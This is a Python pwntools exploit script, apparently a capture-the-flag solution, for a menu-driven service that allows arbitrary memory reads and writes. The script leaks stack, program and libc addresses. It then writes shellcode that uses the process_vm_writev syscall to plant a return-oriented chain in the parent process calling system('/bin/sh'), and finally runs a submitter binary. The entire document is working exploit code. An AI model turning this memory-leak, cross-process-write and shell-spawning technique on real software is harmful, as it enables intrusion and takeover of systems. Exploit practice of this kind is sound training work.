from pwn import *
import time
import os

#p = process("./challenge", env={"LD_PRELOAD":"./libc.so.6 ./libseccomp.so.2"})
#context.log_level = "debug"
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))

context.arch = "amd64"

def readv(addr:int):
    p.sendlineafter(b"Choice:", b"1")
    p.sendlineafter(b"Address:", hex(addr).encode())
    p.recvuntil(b"Value: ")
    value = int(p.recvuntil(b"\n", drop=True).strip(), 16)
    print(f"read value from {hex(addr)}:", hex(value))
    return value

def writev(addr:int, value:int):
    p.sendlineafter(b"Choice:", b"2")
    p.sendlineafter(b"Value:", hex(value).encode())
    p.sendlineafter(b"Address:", hex(addr).encode())

def _exit():
    p.sendlineafter(b"Choice:", b"3")

def leak():
    p.sendlineafter(b"Choice:", b"1")
    p.sendlineafter(b"Address:", b"+")
    p.recvuntil(b"Value: ")
    value = int(p.recvuntil(b"\n", drop=True).strip(), 16)
    print(f"read value from leak:", hex(value))
    return value

stack_leak_addr = leak()
main_ret = stack_leak_addr - 0x70 - 0xa0
print("main_ret:", hex(main_ret))
elf_leak = readv(stack_leak_addr-0x20)
elf_base = elf_leak - 0x1285
print("elf_base:", hex(elf_base))
shellcode_addr = elf_base + 0x1484+8
print("shellcode_addr:", hex(shellcode_addr))
puts_libc = readv(elf_base+0x34d8)
print("puts_libc:", hex(puts_libc))
libc_base = puts_libc - 0x80e50
print("libc_base:", hex(libc_base))
binsh = libc_base + 0x1d8678
pop_ret = libc_base + 0x2a3e5
ret = libc_base + 0x29139
libc_system = libc_base + 0x50d70

getppid_shellcode = '''
    mov rax, 110;
    syscall;
'''

writev_shellcode = '''
    mov rdi, rax;

    mov rax, {value};
    push rax;
    push 8;
    lea rax, [rsp+8];
    push rax;
    mov rsi, rsp;
    mov rdx, 1;
    push 8;
    mov rax, {addr};
    push rax;
    mov r10, rsp;
    mov r8, 1;
    mov r9, 0;
    mov rax, 311;
    syscall;
'''

loop_shellcode = '''
HERE:
    jmp HERE;
'''

def shellcode_arb_write(addr, value):
    buf = b""
    buf += asm(getppid_shellcode)
    buf += asm(writev_shellcode.format(value=hex(value), addr=hex(addr)))
    return buf

shellcode = b""
shellcode += shellcode_arb_write(main_ret, pop_ret)
shellcode += shellcode_arb_write(main_ret+8, binsh)
shellcode += shellcode_arb_write(main_ret+0x10, ret)
shellcode += shellcode_arb_write(main_ret+0x18, libc_system)
shellcode += asm(loop_shellcode)
shellcode = shellcode.ljust(0x300, b"\x90")

for i in range(0, len(shellcode), 8):
    writev(shellcode_addr+i, u64(shellcode[i:i+8]))

writev(shellcode_addr-8, 0x9090909090909090)

time.sleep(2)

_exit()

p.sendline("./submitter")

_data = p.recvall(timeout=3)
print(_data)
